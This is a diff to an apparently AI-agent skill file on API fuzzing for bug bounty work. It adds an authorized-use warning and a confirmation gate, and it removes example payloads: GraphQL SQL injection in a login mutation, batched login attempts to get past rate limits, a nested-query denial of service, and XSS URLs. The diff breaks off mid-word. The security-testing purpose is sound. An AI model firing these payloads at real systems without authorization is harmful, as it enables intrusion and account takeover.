@@ -8,6 +8,20 @@ url: https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/api-
 ---
 
 
+> **⚠️ AUTHORIZED USE ONLY**
+> This skill is for educational purposes or authorized security assessments only.
+> You must have explicit, written permission from the system owner before using this tool.
+> Misuse of this tool is illegal and strictly prohibited.
+
+> **Mandatory confirmation gate**
+> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
+> 1. Ask the user to state the exact target URL, IP, account, or resource.
+> 2. Ask the user to confirm written authorization and the permitted scope.
+> 3. Show the exact command(s) and explain their expected effect.
+> 4. Wait for explicit confirmation in the current conversation.
+>
+> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
+
 > AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
 
 # API Fuzzing for Bug Bounty
@@ -208,50 +222,4 @@ query {
 ### GraphQL SQL/NoSQL Injection
 
 ```graphql
-mutation {
-  login(input: {
-    email: "test' or 1=1--"
-    password: "password"
-  }) {
-    success
-    jwt
-  }
-}
-```
-
-### Rate Limit Bypass (Batching)
-
-```graphql
-mutation {login(input:{email:"a@example.com" password:"password"}){success jwt}}
-mutation {login(input:{email:"b@example.com" password:"password"}){success jwt}}
-mutation {login(input:{email:"c@example.com" password:"password"}){success jwt}}
-```
-
-### GraphQL DoS (Nested Queries)
-
-```graphql
-query {
-  posts {
-    comments {
-      user {
-        posts {
-          comments {
-            user {
-              posts { ... }
-            }
-          }
-        }
-      }
-    }
-  }
-}
-```
-
-### GraphQL XSS
-
-```bash
-# XSS via GraphQL endpoint
-http://target.com/graphql?query={user(name:"<script>alert(1)</script>"){id}}
-
-# URL-encoded XSS
-http://target.com/example?id=%C/script%E%Cscript%Ealert('XSS')%C
+mut
